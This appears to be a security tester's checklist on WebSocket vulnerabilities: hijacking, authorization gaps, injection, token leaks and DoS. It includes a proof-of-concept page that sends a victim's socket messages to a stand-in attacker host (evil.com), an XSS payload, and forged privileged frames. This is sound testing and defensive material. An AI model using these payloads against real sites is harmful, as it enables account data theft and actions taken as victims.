# WebSocket Security (CSWSH + message attacks)

**What it is:** WebSockets (`ws://`/`wss://`) upgrade an HTTP connection to a full-duplex channel. They frequently skip the auth/authz/validation the REST side enforces, and the handshake is CSRF-able. Under-tested surface.

## Recon
- [ ] Find WS endpoints: JS (`new WebSocket(...)`), `Upgrade: websocket` in traffic, `/ws`, `/socket.io`, `/graphql` (subscriptions), `/cable` (Rails ActionCable).
- [ ] Proxy through Burp (WebSocket history) or `wsrepl`/`wscat` to replay/edit frames.
- [ ] Note how auth is carried: cookie (CSWSH-prone), token in URL (leaks), first-message auth.

## 1. Cross-Site WebSocket Hijacking (CSWSH) — the big one
The WS handshake is a normal cross-origin GET that **sends cookies** and often has **no CSRF token** and **no `Origin` check**. Attacker page opens the socket as the victim and reads/sends.

### Handshake — Request → Response
```http
GET /ws/notifications HTTP/1.1
Host: target.com
Origin: https://evil.com                 ← attacker origin, not validated
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Version: 13
Cookie: session=<victim, sent cross-site>
```
```http
HTTP/1.1 101 Switching Protocols          ← accepted from evil.com origin = CSWSH
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
```
PoC page:
```html
<script>
 var ws = new WebSocket("wss://target.com/ws/notifications");
 ws.onopen = () => ws.send(JSON.stringify({action:"getMessages"}));
 ws.onmessage = e => fetch("https://evil.com/x?d="+btoa(e.data));  // exfil victim data
</script>
```
**Tell:** `101` regardless of `Origin`, and messages return the victim's data → steal data / perform actions as victim.

## 2. Missing authz / IDOR over WS
Once connected, WS messages may not re-check ownership:
```json
{"action":"getConversation","id":"9c8b7a6d-...victim..."}   → returns victim's messages
```
- [ ] Swap IDs in WS frames (same BOLA logic as REST, often un-checked).
- [ ] Send privileged actions (`{"action":"admin.deleteUser"}`) the UI never exposes.

## 3. Injection through WS frames
WS input often lands in the same sinks as HTTP, but bypasses HTTP WAFs:
- [ ] XSS: send `<img src=x onerror=alert(document.domain)>` in a chat frame → stored, renders for others.
- [ ] SQLi / NoSQLi / command injection in frame values (backend trusts the channel).
- [ ] Frames skip the WAF that inspects HTTP bodies → a clean bypass path.

## 4. Auth / token handling
- [ ] Token in the WS URL (`wss://t/ws?token=...`) → logged, referer-leaked.
- [ ] No re-auth after token expiry; socket stays privileged.
- [ ] First-message auth that can be skipped / replayed.

## 5. Rate limits / DoS
- [ ] No per-connection limit → flood messages, brute OTP over WS (bypasses HTTP rate limit).
- [ ] Unbounded subscriptions (GraphQL subscriptions, ActionCable) → resource exhaustion.

## 6. Tunneling / SSRF via WS proxy
- [ ] `websocket-smuggle` / `h2c` upgrade tricks to reach internal services through a permissive WS proxy.

## Impact
Account data theft (CSWSH), IDOR/privileged actions, stored XSS, WAF-bypassed injection, DoS.

## Report notes
For CSWSH: show the `101` accepted with `Origin: https://evil.com` + a PoC exfiltrating your own account's data cross-origin. Fix = validate `Origin` + CSRF token on the handshake, auth every message.

## Tools
Burp (WebSocket history + repeater), `wsrepl`, `wscat`, `websocat`, custom JS PoC.

## Deep cuts — socket.io, subprotocols, and desync
- [ ] **Auth carried in `Sec-WebSocket-Protocol`:** some apps put the bearer token in the subprotocol header (to avoid query-string logging) — it's still attacker-observable in JS and sometimes not validated; try omitting/forging it.
- [ ] **socket.io / engine.io polling fallback:** before the WS upgrade, the client falls back to XHR long-polling (`/socket.io/?transport=polling`). That HTTP path may enforce *different* (weaker) auth/CORS than the WS — attack it directly, and check CSWSH on the upgrade separately.
- [ ] **GraphQL-over-WS (`graphql-ws`/`subscriptions-transport-ws`):** the `connection_init` payload auths the socket; subsequent `subscribe` messages may skip per-operation authz → IDOR/BOLA over subscriptions; introspection may be open on the WS even if blocked on HTTP (`07-api/02`).
- [ ] **First-message-auth race/skip:** send privileged frames before/without the auth frame; or replay a captured `connection_init`.
- [ ] **Cross-protocol / h2c smuggling to reach the WS backend** or tunnel to internal services via a permissive proxy (`10-server-edge/02`).
- [ ] **`permessage-deflate` compression DoS:** a small compressed frame inflating to a huge payload (zip-bomb-style) can exhaust memory — note the vector, don't sustain it.
- [ ] **Message-schema fuzzing:** the same type-confusion/NoSQLi/mass-assignment fuzzing from `04-auth-session/08` applies to JSON frames and bypasses HTTP WAFs.
- [ ] **Origin allowlist bypass on the handshake:** `Origin: null`, sub-string/regex flaws (same matrix as CORS, `02`) — a "checked" origin that's loosely matched is still CSWSH.

## Sources
PortSwigger CSWSH Academy; OWASP WSTG WebSocket testing; graphql-ws / socket.io security notes.
